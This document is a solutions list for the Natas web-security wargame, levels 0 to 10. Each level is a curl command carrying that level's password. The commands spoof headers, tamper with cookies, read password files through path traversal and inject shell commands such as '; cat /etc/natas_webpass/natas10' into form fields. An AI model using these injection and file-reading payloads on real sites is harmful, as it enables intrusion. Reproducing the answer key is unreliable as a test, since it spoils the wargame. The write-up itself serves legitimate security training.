### Solutions

natas0
```
curl --silent --user natas0:natas0 http://natas0.natas.labs.overthewire.org
```

natas1
```
curl --silent --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org
```

natas2
```
curl --silent --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt
```

natas3
```
curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

natas4
```
curl --silent --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/index.php
```

natas5
```
curl --silent --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie loggedin=1 http://natas5.natas.labs.overthewire.org
```

natas6
```
curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc
curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 --request POST --form 'submit=1' --form 'secret=FOEIUWGHFEEUHOFUOIU' http://natas6.natas.labs.overthewire.org
```

natas7
```
curl --silent --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

natas8
```
curl --silent --user natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe --request POST --form 'submit=1' --form 'secret=oubWYf2kBq' http://natas8.natas.labs.overthewire.org
```

natas9
```
curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl --request POST --form 'needle=wwwwww dictionary.txt; cat /etc/natas_webpass/natas10; touch' http://natas9.natas.labs.overthewire.org
```

natas10
```
curl --silent --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu --request POST --form 'needle=2 /etc/natas_webpass/natas11' http://natas10.natas.labs.overthewire.org
```

`
natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
`